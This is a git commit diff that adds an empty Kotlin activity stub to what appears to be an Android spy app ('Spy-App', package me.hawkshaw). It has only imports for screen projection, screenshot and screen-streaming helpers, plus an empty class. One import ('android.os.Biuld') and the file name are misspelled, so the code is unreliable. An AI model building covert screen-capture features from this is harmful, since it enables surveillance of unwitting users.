cd50620667cc0aed95495001b2b8f432c53f58a2
steiner-254 <steineralvin3@gmail.com>
2024-06-19 23:16:16 +0300

    update

---
+++ Spy-App/ScreenPojectionActivity.kt
@@ -0,0 +1,28 @@
+package me.hawkshaw.activities
+
+import android.app.Activity
+import android.app.Service
+import android.content.Context
+import android.content.Intent
+import android.graphics.PixelFormat
+import android.media.projection.MediaProjectionManager
+import android.os.Biuld
+import android.os.Bundle
+import android.os.Handler
+import android.os.PowerManager
+import android.provider.Settings
+import android.view.Gravity
+import android.view.LayoutInflater
+import android.view.WindowManager
+import android.widget.LinearLayout
+import android.widget.Toast
+import me.hawkshaw.R
+import me.hawkshaw.tasks.TakeScreenShot
+import android.widget.TextView
+import me.hawkshaw.tasks.StreamScreen
+import me.hawkshaw.utils.Constants
+import org.json.JSONObject
+
+class ScreenProjectionActivity : Activity() {
+    
+}
